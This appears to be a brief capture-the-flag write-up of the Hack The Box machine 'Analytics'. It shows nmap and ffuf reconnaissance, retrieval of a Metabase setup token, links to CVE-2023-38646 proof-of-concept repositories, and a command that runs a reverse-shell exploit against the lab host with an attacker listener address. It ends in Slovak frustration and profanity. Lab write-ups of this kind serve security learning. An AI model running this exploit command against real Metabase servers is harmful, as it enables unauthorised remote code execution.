# Analytics

Starting scanning ports with nmap

<figure><img src=".gitbook/assets/obrazek (23).png" alt=""><figcaption></figcaption></figure>

With ffuf we find sub-domain data so we need to add it to etc/hosts/

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://analytical.htb -H "Host: FUZZ.analytical.htb" -mc 200
```

<figure><img src=".gitbook/assets/obrazek (24).png" alt=""><figcaption></figcaption></figure>

Find exploit to metabase: [https://github.com/shamo0/CVE-2023-38646-PoC](https://github.com/shamo0/CVE-2023-38646-PoC)

So going to ../api/session/properties

setup-token: "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

<figure><img src=".gitbook/assets/obrazek (25).png" alt=""><figcaption></figcaption></figure>

I find problem with that github i dont have professional burpsuite, so i cant get collaborator-url

Another github i found: [https://github.com/securezeron/CVE-2023-38646.git](https://github.com/securezeron/CVE-2023-38646.git)

python CVE-2023-38646-Reverse-Shell.py --rhost data.analytical.htb/ --lhost 10.10.14.123

Totálna sračka exploit niekomu ide, niekomu nie !!! \
\+ pri restarte nejde 80ka port !!!

F\*ck U
